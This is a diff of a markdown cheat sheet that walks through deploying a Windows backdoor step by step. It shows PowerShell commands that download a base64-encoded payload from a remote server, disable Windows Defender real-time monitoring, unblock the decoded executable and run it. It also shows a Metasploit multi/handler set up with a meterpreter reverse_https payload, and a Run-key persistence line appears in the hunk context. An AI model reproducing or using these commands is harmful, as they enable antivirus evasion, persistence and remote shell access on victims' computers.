@@ -28,11 +28,7 @@ python -m http.server
 ## Download String base64 backdoor
 Download String From Your Server Python
 ``` powershell
-(New-Object System.Net.WebClient).DownloadString("http://example.com/file-encode.txt") > file-encoded.txt
-```
-## Disable Windows Defender
-```
-Set-MpPreference -DisableRealtimeMonitoring $true
+(New-Object System.Net.WebClient).DownloadString("http://example.com/file-encode.txt") > file.txt
 ```
 ## Ddecode Base64
 
@@ -48,30 +44,34 @@ New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name
 Run msfconsole
 
 - Use exploit handler
-```
+``` msfconsole
 use exploit/multi/handler
-```
+``` 
 - Set Payload
-```
+``` msfconsole
 set payload windows/meterpreter/reverse_https
 ```
 - Set Lhost
-```
+``` msfconsole
 set lhost [your ip] 
 ```
 - Set lport
-```
+``` msfconsole
 set lport [your port]
 ```
 - Run
-```
+``` msfconsole
 run 
 ```
-## Unlock Backdoor
+## Disable Windows Defender
+``` powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+## Unlock Backdoor
+```powershell
 Unblock-File -Path c:\Users\[User Name]\AppData\LocalLow\Temp\decode.exe
 ```
 ## Execute Backdoor
-```
+```powershell
 ./decode.exe
 ```
